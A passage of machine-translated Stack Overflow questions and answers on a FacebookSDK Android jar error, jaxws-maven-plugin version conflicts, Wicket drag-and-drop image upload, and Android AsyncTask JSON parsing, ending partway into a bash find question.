## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T15:11:15.237

根据文档，您可以致电：

```
+ (void)attemptRotationToDeviceOrientation 
```

如果我正确理解了文档，那么它将再次查询旋转到不同的视图控制器。

# android - 错误：项目 FacebookSDK 中的“._android-support-v4.jar”

> ID：13841432
> 
> 赞同：0
> 
> 时间：2012-12-12T13:59:57.180
> 
> 标签：android, facebook

需要帮助！！！！坚持了 2 周，需要帮助。

我最近将 facebook sdk for android 及其项目导入我的工作区。它显示错误和问题：

> 所需库的存档：无法读取项目“FacebookSDK”中的“/home/Documents/facebook-android-sdk-3.0.2.b/facebook/libs/._android-support-v4.jar”或不是有效的 ZIP文件

样本会出现以下错误：

> 容器“Android Dependencies”引用了不存在的库“/home/Documents/facebook-android-sdk-3.0.2.b/facebook/bin/facebooksdk.jar”

我在其他讨论之后所做的事情没有任何成功是

清洁项目

将 Facebook SDK 设置为库

查看了构建路径部分并添加了由 facebook/libs 组成的外部 jar

像 20 次一样将 fb sdk 导入到不同的文件夹中。

确保我的 java 编译器是 1.6

帮助将不胜感激！！！！

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-12-12T14:11:22.927

取最新版本的`android-support-v4.jar`（在您的 sdk 环境中：）`sdk/extras/android/support/v4/android-support-v4.jar`并在您的项目和库项目中替换不会产生冲突。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:07:19.340

导入库的步骤是：

1.  下载库
2.  将库放在项目的 libs 文件夹中。
3.  构建项目
4.  **不要**尝试使用某些导入向导来导入库。

我怀疑您的下载已损坏，您需要再次执行此操作，或者您直接将文件放入错误中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-31T01:48:11.407

我认为您的问题是 android.support.v4 版本不同，从您的项目中取出一个并替换 Facebook sdk lib 文件夹中的一个，它应该消除冲突。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-12-05T10:22:47.060

根据您的问题，我认为一旦将 SDK 添加到项目中，您将无法编译。您是否收到无法作为库运行的错误消息？如果是这样，这意味着您已将其包含为库并将您的项目创建为库以供进一步使用。这是我看到很多人在尝试导入要使用的库时犯的一个常见错误，并勾选复选框是库。这实际上意味着您希望将此项目视为库以供将来使用。只需尝试添加 SDK，不要勾选复选框，该项目将运行良好。许多论坛只会告诉您勾选该复选框，您将长时间停留在此错误上。

对于任何与 .jar 文件相关的问题，您必须使 .jars 文件兼容，因为存在散列问题并且两个 jar 彼此不兼容（版本问题）。

# jax-ws - jaxws-maven-plugin 2.2 NoSuchMethodError() 失败

> ID：13841437
> 
> 赞同：11
> 
> 时间：2012-12-12T14:00:10.253
> 
> 标签：jax-ws, maven-plugin

我正在尝试使用 jaxws maven 插件为我的 Web 服务客户端生成源代码并获得以下异常；

```
 [ERROR] Failed to execute goal org.jvnet.jax-ws-commons:jaxws-maven-plugin:2.2:wsimport (default) on project cf-wsjavaclient: Error executing: wsimpor
t [-keep, -s, C:\Users\sjunejo\Documents\GitHub\sandbox-ofsconnectorpoc\cf-wsjavaclient\target, -Xnocompile, http://localhost:9090/axis2/services/OFSC
onnectorServiceWS?wsdl]: UndeclaredThrowableException: javax.xml.bind.annotation.XmlElementRef.required() -> [Help 1]
org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.jvnet.jax-ws-commons:jaxws-maven-plugin:2.2:wsimport (default) on p
roject cf-wsjavaclient: Error executing: wsimport [-keep, -s, C:\Users\sjunejo\Documents\GitHub\sandbox-ofsconnectorpoc\cf-wsjavaclient\target, -Xnoco
mpile, http://localhost:9090/axis2/services/OFSConnectorServiceWS?wsdl]
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:217)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:153)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:145)
        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:84)
        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:59)
        at org.apache.maven.lifecycle.internal.LifecycleStarter.singleThreadedBuild(LifecycleStarter.java:183)
        at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:161)
        at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:320)
        at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:156)
        at org.apache.maven.cli.MavenCli.execute(MavenCli.java:537)
        at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:196)
        at org.apache.maven.cli.MavenCli.main(MavenCli.java:141)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Launcher.java:290)
        at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.java:230)
        at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(Launcher.java:409)
        at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:352)
Caused by: org.apache.maven.plugin.MojoExecutionException: Error executing: wsimport [-keep, -s, C:\Users\sjunejo\Documents\GitHub\sandbox-ofsconnecto
rpoc\cf-wsjavaclient\target, -Xnocompile, http://localhost:9090/axis2/services/OFSConnectorServiceWS?wsdl]
        at org.jvnet.jax_ws_commons.jaxws.WsImportMojo.wsImport(WsImportMojo.java:360)
        at org.jvnet.jax_ws_commons.jaxws.WsImportMojo.processWsdlViaUrls(WsImportMojo.java:342)
        at org.jvnet.jax_ws_commons.jaxws.WsImportMojo.execute(WsImportMojo.java:283)
        at org.jvnet.jax_ws_commons.jaxws.MainWsImportMojo.execute(MainWsImportMojo.java:30)
        at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:101)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:209)
        ... 19 more
Caused by: java.lang.reflect.UndeclaredThrowableException
        at $Proxy44.required(Unknown Source)
        at com.sun.tools.xjc.generator.bean.field.AbstractField.annotateReference(AbstractField.java:192)
        at com.sun.tools.xjc.generator.bean.field.AbstractField.annotate(AbstractField.java:161)
        at com.sun.tools.xjc.generator.bean.field.AbstractFieldWithVar.createField(AbstractFieldWithVar.java:80)
        at com.sun.tools.xjc.generator.bean.field.SingleField.<init>(SingleField.java:94)
        at com.sun.tools.xjc.generator.bean.field.SingleField.<init>(SingleField.java:81)
        at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
        at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39)
        at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27)
        at java.lang.reflect.Constructor.newInstance(Constructor.java:513)
        at com.sun.tools.xjc.generator.bean.field.GenericFieldRenderer.generate(GenericFieldRenderer.java:69)
        at com.sun.tools.xjc.generator.bean.field.DefaultFieldRenderer.generate(DefaultFieldRenderer.java:82)
        at com.sun.tools.xjc.generator.bean.BeanGenerator.generateFieldDecl(BeanGenerator.java:774)
        at com.sun.tools.xjc.generator.bean.BeanGenerator.generateClassBody(BeanGenerator.java:555)
        at com.sun.tools.xjc.generator.bean.BeanGenerator.<init>(BeanGenerator.java:258)
        at com.sun.tools.xjc.generator.bean.BeanGenerator.generate(BeanGenerator.java:166)
        at com.sun.tools.xjc.model.Model.generateCode(Model.java:290)
        at com.sun.tools.xjc.api.impl.s2j.SchemaCompilerImpl.bind(SchemaCompilerImpl.java:283)
        at com.sun.tools.xjc.api.impl.s2j.SchemaCompilerImpl.bind(SchemaCompilerImpl.java:94)
        at com.sun.tools.ws.processor.modeler.wsdl.JAXBModelBuilder.bind(JAXBModelBuilder.java:142)
        at com.sun.tools.ws.processor.modeler.wsdl.WSDLModeler.buildJAXBModel(WSDLModeler.java:2244)
        at com.sun.tools.ws.processor.modeler.wsdl.WSDLModeler.internalBuildModel(WSDLModeler.java:191)
        at com.sun.tools.ws.processor.modeler.wsdl.WSDLModeler.buildModel(WSDLModeler.java:137)
        at com.sun.tools.ws.wscompile.WsimportTool.buildWsdlModel(WsimportTool.java:381)
        at com.sun.tools.ws.wscompile.WsimportTool.run(WsimportTool.java:198)
        at com.sun.tools.ws.wscompile.WsimportTool.run(WsimportTool.java:179)
        at com.sun.tools.ws.WsImport.doMain(WsImport.java:74)
        at org.jvnet.jax_ws_commons.jaxws.WsImportMojo.wsImport(WsImportMojo.java:357)
        ... 24 more
Caused by: java.lang.NoSuchMethodException: javax.xml.bind.annotation.XmlElementRef.required()
        at java.lang.Class.getDeclaredMethod(Class.java:1937)
        at com.sun.codemodel.TypedAnnotationWriter.invoke(TypedAnnotationWriter.java:112)
        ... 52 more 
```

这是我用来构建项目的 POM；

```
 <project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.xxxxx</groupId>
    <artifactId>cf-wsjavaclient</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>cf-wsjavaclient</name>
    <properties>
        <wsdlLoc>http://localhost:9090/axis2/services/OFSConnectorServiceWS?wsdl</wsdlLoc>
        <skipTests>true</skipTests>
    </properties>
    <build>
        <plugins>
        <plugin>
            <artifactId>maven-failsafe-plugin</artifactId>
            <version>2.6</version>
            <!-- Disable tests for now, until we have client jar built then we can run as follows;
                To run the tests:
                $ mvn verfiy -DskipTests=false
            -->             
            <configuration>
                <skipTests>${skipTests}</skipTests>
            </configuration>
            <executions>
                <execution>
                    <goals>
                        <goal>integration-test</goal>
                        <goal>verify</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
            <plugin>
                <groupId>org.jvnet.jax-ws-commons</groupId>
                <artifactId>jaxws-maven-plugin</artifactId>
                <version>2.2</version>
                <executions>
                    <execution>
                        <goals>
                            <goal>wsimport</goal>
                        </goals>
                    </execution>
                </executions>
                <configuration>
                    <wsdlUrls>
                        <wsdlUrl>${wsdlLoc}</wsdlUrl>
                    </wsdlUrls>
                    <sourceDestDir>${basedir}/target</sourceDestDir>
                </configuration>
            </plugin>
             <!-- Don't forget to use endorsed with JAX-WS 2.2 on Java 6 !! -->
                <!-- plugin>
                    <artifactId>maven-compiler-plugin</artifactId>
                    <configuration>
                    <source>1.6</source>
                    <target>1.6</target>
                    <compilerArguments>
                        <endorseddirs>${basedir}/endorsed</endorseddirs>
                        </compilerArguments>
                    </configuration>
                </plugin-->
        </plugins>
    </build>
    <dependencies>
        <dependency>
            <groupId>com.sun.xml.ws</groupId>
            <artifactId>jaxws-rt</artifactId>
            <version>2.2.6</version>
        </dependency>
        <dependency>
            <groupId>javax.xml.bind</groupId>
            <artifactId>jaxb-api</artifactId>
            <version>2.2.5</version>
        </dependency>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.8.2</version>
            <scope>test</scope>
        </dependency>
    </dependencies>
</project> 
```

我试图查找信息，但没有可用的信息。能否请你帮忙。

谢谢

--

斯茹内霍

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-02-21T13:09:19.133

我最近遇到了同样的错误。
似乎这是因为*wsimport*与*jaxb的***2.1**和**2.2**版本混淆了。

 **通过编辑项目pom.xml*`<target>2.1</target>`并向每个导入的 wsdl 的配置添加标签，我能够正确生成 Web 服务源，如下所示：

```
<execution>
    <goals>
        <goal>wsimport</goal>
    </goals>
    <configuration>
        <wsdlFiles>
            <wsdlFile>path/to/file.wsdl</wsdlFile>
        </wsdlFiles>
        <wsdlLocation>http://path/to/webservice?wsdl</wsdlLocation>
        <staleFile>path/to/file.stale</staleFile>
        <target>2.1</target>
    </configuration>
    <id>wsimport-generate-WebServiceName</id>
    <phase>generate-sources</phase>
</execution> 
```

希望它对遇到此问题的人有所帮助。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-02-27T00:00:59.147

我根据您的问题推测您在 Java 6 上运行？因为 Java 6 包含旧版本的 JAX-WS，如果您想在 Java 6 上生成、编译和运行 JAX-WS 2.2，您必须覆盖这些包含的 API。正如 Tex Killer 上面提到的，您可以告诉 wsimport 生成JAX-WS 2.1 对象和一切都应该正常工作（假设您拥有包含 JAX-WS 2.1 而不是 2.0 的 Java 6 JRE 之一）。但是，如果您特别想为 2.2 生成，我可以通过将我的 POM 设置为以下内容来做到这一点（为简洁起见，我只包含了*build*元素）：

```
<build>
    <plugins>
        <!-- Generate client using WSDL -->
        <plugin>
            <groupId>org.jvnet.jax-ws-commons</groupId>
            <artifactId>jaxws-maven-plugin</artifactId>
            <executions>
                <execution>
                    <goals>
                        <goal>wsimport</goal>
                    </goals>
                    <configuration>
                        <target>2.2</target>
                        <verbose>true</verbose>
                        <wsdlUrls>
                            <wsdlUrl>http://localhost:8080/axis2/services/HelloWorld?wsdl</wsdlUrl>
                        </wsdlUrls>
                        <packageName>my.package.name</packageName>
                    </configuration>
                </execution>
            </executions>

            <!-- if you want to use a specific version of JAX-WS, you can do so like 
                this -->
            <dependencies>
                <dependency>
                    <groupId>com.sun.xml.ws</groupId>
                    <artifactId>jaxws-tools</artifactId>
                    <version>2.2.7</version>
                    <exclusions>
                        <exclusion>
                            <groupId>org.jvnet.staxex</groupId>
                            <artifactId>stax-ex</artifactId>
                        </exclusion>
                    </exclusions>
                </dependency>
                <dependency>
                    <groupId>org.jvnet.staxex</groupId>
                    <artifactId>stax-ex</artifactId>
                    <version>1.7</version>
                    <exclusions>
                        <exclusion>
                            <groupId>javax.xml.stream</groupId>
                            <artifactId>stax-api</artifactId>
                        </exclusion>
                    </exclusions>
                </dependency>
            </dependencies>
        </plugin>

        <!-- Don't forget to use endorsed with JAX-WS 2.2 on Java 6 !! -->
        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-dependency-plugin</artifactId>
            <version>2.3</version>
            <executions>
                <execution>
                    <phase>validate</phase>
                    <goals>
                        <goal>copy</goal>
                    </goals>
                    <configuration>
                        <outputDirectory>${project.build.directory}/endorsed</outputDirectory>
                        <silent>true</silent>
                        <artifactItems>
                            <artifactItem>
                                <groupId>javax.xml.bind</groupId>
                                <artifactId>jaxb-api</artifactId>
                                <version>2.2.4</version>
                                <type>jar</type>
                            </artifactItem>
                            <artifactItem>
                                <groupId>javax.xml.ws</groupId>
                                <artifactId>jaxws-api</artifactId>
                                <version>2.2.8</version>
                                <type>jar</type>
                            </artifactItem>
                        </artifactItems>
                    </configuration>
                </execution>
            </executions>
        </plugin>
        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-compiler-plugin</artifactId>
            <version>2.3</version>
            <configuration>
                <source>1.6</source>
                <target>1.6</target>
                <compilerArguments>
                    <endorseddirs>${project.build.directory}/endorsed</endorseddirs>
                </compilerArguments>
            </configuration>
        </plugin>
    </plugins>
</build> 
```

我认为您需要在 POM 中进行三项更改才能使其正常工作。我从这里得到的所有三个：http: [//jax-ws-commons.java.net/jaxws-maven-plugin/usage.html](http://jax-ws-commons.java.net/jaxws-maven-plugin/usage.html)。首先，您可能需要像我上面那样为 jaxws 插件添加额外的依赖项。另请注意，您必须取消注释 maven-compiler-plugin，但您似乎已正确设置了认可的目录。第三，您需要添加 maven-dependency-plugin 的定义。您可能需要修改 JAXB 和 JAX-WS API 版本以满足您的需要。

除了这些之外，我还必须通过将 JAXB 和 JAX-WS API（在 POM 中定义的相同）的 jar 放在 <java-home>/lib/endorsed 下来更新启动 Maven 的 JRE。 . 最后，确保刚刚更新的 JRE 正在启动 Maven 构建。如果它仍然无法正常工作，请检查您的 Maven 构建的 Eclipse 运行配置，并确保它使用带有认可库的 JRE。（在我的情况下，运行配置使用的 JRE 与项目配置不同——我更新了项目 JRE，但没有更新运行配置使用的 JRE，我花了大约一天的时间才弄清楚为什么它仍然没有在职的）。

那应该对你有用。如果您想更了解它，您可以更新运行配置以直接引用外部认可的库，以防您不想修改 JRE 安装。

干杯*

# java - 用于添加图像的 Wicket 拖放功能

> ID：13841444
> 
> 赞同：5
> 
> 时间：2012-12-12T14:00:30.950
> 
> 标签：java, drag-and-drop, wicket

我正在制作一个 wicket 应用程序，它可以管理 Cashdesk 应用程序的一些选项。选项之一是更改`selected` **Product**的图像。

选择此选项时，用户（管理员）可以从数据库 (SQL) 中已经存在的图像中进行选择，或者如果所需的图像不存在，则添加新图像。 ![不要提及测试名称和令人敬畏的图像（它仍在测试阶段）](../Images/bec25feab654d4d9cee01565519d8327.png)*不要提及测试名称和令人敬畏的图像（它仍在测试阶段）*

我更喜欢看到通过拖放 **[html5 演示 [dnd-upload]](http://html5demos.com/dnd-upload)**
实现的图像添加 （从桌面到浏览器）

我目前正在使用**Wicket-6.2.0**和**wicket-dnd 0.5.0**，但我似乎无法正常工作！我能找到的所有示例都来自 wicket 2.x 或更低版本。

在 Wicket-6.2 中可以使用拖放，但我该如何实现呢？

wicket 中似乎有一些[DraggableBehavior ？](http://www.servoy.com/docs/public-api/61x/com/servoy/j2db/server/headlessclient/dnd/DraggableBehavior.html)欢迎任何帮助！

**[更新]**

升级到**wicket-dnd 0.6**

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-11-15T11:49:35.587

根据您的代码，我编写了自定义 Ajax 行为。然而，我简化了它，它对我有用，而不需要拖拽破解。

AbstractFileDropAjaxBehavior.java

```
public abstract class AbstractFileDropAjaxBehavior extends AbstractDefaultAjaxBehavior
{

    @Override
    protected void respond(final AjaxRequestTarget target)
    {
        RequestCycle requestCycle = RequestCycle.get();

        StringValue data = requestCycle.getRequest().getRequestParameters().getParameterValue("data");
        String[] base64Data = data.toString().split(";");
        String fileName = base64Data[0].substring(base64Data[0].indexOf(':') + 1, base64Data[0].length());
        String dataType = base64Data[1].substring(base64Data[1].indexOf(':') + 1, base64Data[1].length());
        String binaryData = base64Data[2].substring(base64Data[2].indexOf(',') + 1, base64Data[2].length());
        byte[] rawData = DatatypeConverter.parseBase64Binary(binaryData);

        processFile(fileName, dataType, rawData);
    }

    @Override
    protected void onComponentTag(ComponentTag tag) {
        tag.put("my:dropcontainer.callback", getCallbackUrl().toString());

        tag.put("ondragover", "return false;");
        tag.put("ondrop", "return AbstractFileDropAjaxBehavior_upload(event, '#" + tag.getId() + "');");
        tag.put("ondragenter", "$('#" + tag.getId() + "').addClass('dropover')");
        tag.put("ondragleave", "$('#" + tag.getId() + "').removeClass('dropover')");
    }

    @Override
    public void renderHead(Component component, IHeaderResponse response) {
        super.renderHead(component, response);

        response.render(OnDomReadyHeaderItem.forScript("jQuery.event.props.push('dataTransfer');"));

        response.render(JavaScriptContentHeaderItem.forScript("function AbstractFileDropAjaxBehavior_upload(e, selector) {\n" + 
                "   var files = e.dataTransfer.files;\n" + 
                "   \n" + 
                "   $.each(files, function(i, file) {\n" + 
                "       var reader = new FileReader();\n" + 
                "       \n" + 
                "       reader.onload = function(input) {\n" + 
                "           var fileName = \"fileName:\" + file.name + \";\";\n" + 
                "           var base64data = input.target.result;\n" + 
                "           \n" + 
                "           Wicket.Ajax.post({\n" + 
                "               \"u\": $(selector).attr('my:dropcontainer.callback'),\n" + 
                "               \"ep\": {\n" + 
                "                   \"data\" : fileName + base64data,\n" + 
                "               },\n" + 
                "           });\n" + 
                "           \n" + 
                "       };\n" + 
                "\n" + 
                "       reader.readAsDataURL(file);\n" + 
                "   });\n" + 
                "   \n" + 
                "   $(selector).removeClass('dropover');\n" + 
                "   \n" + 
                "   return false;   \n" + 
                "}\n", "AbstractFileDropAjaxBehavior-script"));
    }

    protected abstract void processFile(String fileName, String dataType, byte[] rawData);

} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-19T09:33:09.933

所以这是承诺的答案！（只有代码，但如果您熟悉 wicket，则易于理解）

该代码可以将文件拖到一个区域，并将其发送到检票口服务器（无论它获取什么文件），这并不总是您想要的（但只是我需要的）。

如果您只想上传 1 种类型的文件，请在 drop.js 中添加以下 javascript 检查：

```
// For each file: check if files are images
for (i = 0; i < files.length; i++) {
    if (!files[i].type.match('image.*')) { // Replace with what you need
        $('#dropAppearance p').html('Hey! Images only');
        return false;
    }
} 
```

文件：
- MyPage.java
- MyPage.html
- DropZone.java
- DropZone.html
- DropZone.properties
- DropAjaxBehavior
- drop.js
- drop.css

使用的库：
- jQuery.js
- jQuery-ui.js
- wicket 6.2
- slf4j-1.2.16
- log4j-1.2.16
- guava-13.0.1

*我没有包括进口，因为我很懒*

我的页面.java

```
public final class MyPage extends Page {

    /**
     * Constructor
     */
    public HomePage() {
    }

    @Override
    public void onInitialize() {
        super.onInitialize();
        add(new DropZone("dropZone", 300, 200));
    }
} 
```

我的页面.html

```
<!DOCTYPE html>
<html lang="en">
<body>
    <wicket:extend>
        // The following line adds a DropZone
        <div wicket:id="dropZone"></div>
    </wicket:extend>
</body>
</html> 
```

DropZone.java

```
public class DropZone extends Panel {
    private static final ResourceReference JS_DROP = new JavaScriptResourceReference(DropZone.class, "drop.js");
    private static final ResourceReference CSS_DROP = new CssResourceReference(DropZone.class, "drop.css");
    private static final ResourceReference JQUERY = new JavaScriptResourceReference(DropZone.class, "jQuery.js");
    private static final ResourceReference JQUERY_UI = new JavaScriptResourceReference(DropZone.class, "jQuery-ui.js");

    private static final String ID_DROPZONE = "drop-container";

    /**
     * Constructor
     * 
     * @param id String The component id
     * @param height int The height of the DropZone component [in pixels]
     * @param width int The width of the DropZone component [in pixels]
     */
    public DropZone(String id, int width, int height) {
        super(id);
        final WebMarkupContainer dropZone = new WebMarkupContainer(ID_DROPZONE);
        final DropAjaxBehavior dropAjaxBehavior = new DropAjaxBehavior();

        dropZone.add(dropAjaxBehavior);
        dropZone.add(new AttributeModifier("style", new Model<String>("width:" + width + "px;height:" + height + "px;")));

        add(dropZone);
    }

    @Override
    public final void renderHead(IHeaderResponse response) {
        super.renderHead(response);
        // Important to add jQuery before own javascript
        response.render(JavaScriptHeaderItem.forReference(JQUERY));
        response.render(JavaScriptHeaderItem.forReference(JQUERY_UI));
        response.render(JavaScriptHeaderItem.forReference(JS_DROP));
        response.render(CssContentHeaderItem.forReference(CSS_DROP));
    }
} 
```

DropZone.html

```
<html>
<body>
    <wicket:panel>
        <div wicket:id="drop-container" id="dropContainer">
            <div id="dropAppearance">
                <p>
                    <wicket:message key="drop-message">[DROPZONE MESSAGE]</wicket:message>
                </p>
            </div>
        </div>
    </wicket:panel>
</body> 
```

DropZone.properties

```
drop-message = Drop Files Here 
```

DropAjaxBehavior.java

```
public class DropAjaxBehavior extends AbstractAjaxBehavior {
    private static final Logger LOG = LoggerFactory.getLogger(DropAjaxBehavior.class);

    @Override
    public final void onRequest() {
        LOG.debug("Received request");

        final RequestCycle requestCycle = RequestCycle.get();

        processRequest(requestCycle);
        sendResponse(requestCycle);
    }

    private void processRequest(RequestCycle requestCycle) {

        final WebRequest wr = (WebRequest)requestCycle.getRequest();
        final HttpServletRequest hsr = (HttpServletRequest)wr.getContainerRequest();

        try {
            final byte[] data = new byte[hsr.getContentLength()];
            ByteStreams.readFully(hsr.getInputStream(), data);

            // filename:<NAME>;data:<TYPE>;base64,<FILEDATA>
            final String[] base64Data = new String(data).split(";");
            final String fileName = base64Data[0].substring(base64Data[0].indexOf(':') + 1, base64Data[0].length());
            final String dataType = base64Data[1].substring(base64Data[1].indexOf(':') + 1, base64Data[1].length());
            final String binaryData = base64Data[2].substring(base64Data[2].indexOf(',') + 1, base64Data[2].length());

            // [in my case] do something if the fileType is an image
            if (dataType.contains("image")) {
                final byte[] image = DatatypeConverter.parseBase64Binary(binaryData);
                DatabaseQuery.addImage(image, fileName);
            }
            // But you can make a local file
            // final File file = new File(fileName);
            // final ByteArrayInputStream binaryInputstream = new ByteArrayInputStream(image);
            // final FileOutputStream outputStream = new FileOutputStream(file);
            // ByteStreams.copy(binaryInputstream, outputStream);
            // outputStream.close();
        } catch (IOException ioe) {
            LOG.error("IO error while reading HttpServletRequest: ", ioe);
        }
    }

    private void sendResponse(RequestCycle requestCycle) {
        // Just some response
        requestCycle.scheduleRequestHandlerAfterCurrent(new TextRequestHandler("text/html", "UTF-8", "done"));
    }

    @Override
    protected final void onComponentTag(ComponentTag tag) {
        tag.put("my:dropcontainer.callback", getCallbackUrl().toString());
    }
} 
```

拖放.css

```
#dropContainer {
    background-color: #FFFFFF;
    border: 4px dashed #C9C9C9;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    position: absolute;
}

#dropAppearance {
    height: 100%;
    width: 100%;
    display: table;
    box-sizing: border-box;
}

#dropAppearance p {
    display: table-cell;
    vertical-align: middle;
    text-align: center;
    font-size: 2em;
    color: #797979;
} 
```

drop.js

```
$(document).ready(
        function() {
            // Makes sure the dataTransfer information is sent when we
            // Drop the item in the drop box.
            jQuery.event.props.push('dataTransfer');

            // As far as i know Firefox needs to cancel this event (otherwise it
            // opens
            // dropped files in the browser)
            $('#dropContainer').attr('ondragover', "return false");

            $('#dropContainer').bind(
                    'drop',
                    function(e) {
                        // Files that have been dragged into the drop area
                        var files = e.dataTransfer.files;

                        // Upload each file
                        $.each(files, function(i, file) {
                            var reader = new FileReader();

                            reader.onload = function(input) {
                                var fileName = "fileName:" + file.name + ";";
                                var base64data = input.target.result;

                                $.ajax({
                                    url : $('#dropContainer').attr(
                                            'my:dropcontainer.callback'),
                                    type : 'post',
                                    cache : false,
                                    // Add date before raw base64 file data
                                    data : fileName + base64data,
                                    processData : false,
                                    contentType : false,
                                });
                            };

                            // decode into base64
                            reader.readAsDataURL(file);
                        });
                        return false;
                    });

            // Using little dragging hack because of the HTML5 spec problem
            // URL:
            // http://www.quirksmode.org/blog/archives/2009/09/the_html5_drag.html
            // works like:

            // <parent element>
            // dragging = 0
            // <drop_container>
            // dragging = 1
            // <child>
            // dragging = 2
            // </child>
            // dragging = 1
            // </drop_container>
            // dragging = 0
            // </parent element>

            var dragging = 0;
            $('#dropContainer').bind('dragenter', function() {
                dragging++;
                setHoverDropContainer();
                return false;
            });

            $('#dropContainer').bind('dragleave', function() {
                dragging--;
                if (dragging === 0) {
                    resetHoverDropContainer();
                }
                return false;
            });

            $('#dropContainer').bind('drop', function() {
                dragging = 0; // reset dragging hack
                resetHoverDropContainer();
                return false;
            });
        });

    function setHoverDropContainer() {
        // change colors with smooth transition
        setCSS('#dropContainer', {
            'border-color' : '#0000FF',
            'background-color' : '#EDF4FE',
            '-webkit-transition' : 'background-color 0.6s ease',
            '-moz-transition' : 'background-color 0.6s ease',
            '-o-transition' : 'background-color 0.6s ease',
            'transition' : 'background-color 0.6s ease',
            '-webkit-transition' : 'border-color 0.6s ease',
            '-moz-transition' : 'border-color 0.6s ease',
            '-o-transition' : 'border-color 0.6s ease',
            'transition' : 'border-color 0.6s ease'
        });
    }

    function resetHoverDropContainer() {
        // change colors with smooth transition
        setCSS('#dropContainer', {
            'border-color' : '#C9C9C9',
            'background-color' : '#FFFFFF',
            '-webkit-transition' : 'background-color 0.6s ease',
            '-moz-transition' : 'background-color 0.6s ease',
            '-o-transition' : 'background-color 0.6s ease',
            'transition' : 'background-color 0.6s ease',
            '-webkit-transition' : 'border-color 0.6s ease',
            '-moz-transition' : 'border-color 0.6s ease',
            '-o-transition' : 'border-color 0.6s ease',
            'transition' : 'border-color 0.6s ease'
        });
    }

    function setCSS(element, values) {
        $(element).css(values);
    }
} 
```

# php - AsyncTask 异常 RuntimeException

> ID：13841450
> 
> 赞同：0
> 
> 时间：2012-12-12T14:00:45.963
> 
> 标签：php, android, mysql, android-asynctask

我正在尝试在 android 中使用 AsyncTask 连接到 mysql，但我遇到了并发症。我正在使用接口从 AsyncTask 返回数据，但是当我运行代码时出现以下错误：异常 RuntimeException。非常感谢大家。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T16:04:44.553

在您的 JSON 解析 try/catch 中添加一个通用 Exception 块并发布捕获的错误：

```
//parse json data
 try{
     JSONArray jarray = new JSONArray(result);
        for(int i=0 ; i<jarray.length() ; i++) {
        JSONObject ob = jarray.getJSONObject(i);
        String titulo = ob.getString("title");
        String cate = ob.getString("catid");
        int cat = Integer.parseInt(cate);
        String coord = ob.getString("extra_fields_search");

        String latitud = coord.substring(0, 9);
        Float lat_f = Float.parseFloat(latitud);
        int lat = lat_f *1000000;

        String longitud = coord.substring(10, 19);
        Float lon_f = Float.parseFloat(longitud);
        int lon = lon_f*1000000;

        GeoPoint point = new GeoPoint(lat, lon);
        negocioNuevo = new Negocio(titulo, cat, point);
        listaNegocios.add(negocioNuevo);
        }  
 }catch(JSONException e){
     Log.e("miError de JSON", "Error parsing JSON "+e.toString());
 }catch(Exception e){
     Log.e("miError de General", "Error parsing data "+e.toString());
 } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:11:06.517

在连接类中尝试替换

```
public Conexion(OnTaskCompleted listener){
    this.listener=listener;
} 
```

和

```
public void setOnResultsListener(OnTaskCompleted listener) {
        this.listener = listener;
    } 
```

然后在 MainActivity 中替换：

```
Conexion conexion = new Conexion(this);
conexion.execute("tipo"); 
```

和：

```
Conexion conexion = new Conexion();
conexion.setOnResultsListener(this);
conexion.execute("tipo"); 
```

# linux - 检查 find 命令是否返回某些内容（在 bash 脚本中）

> ID：13841452
> 
> 赞同：2
> 
> 时间：2012-12-12T14:00:46.113
> 
> 标签：linux, bash

我的服务器上有以下 bash 脚本：

```
today=$(date +"%Y-%m-%d")
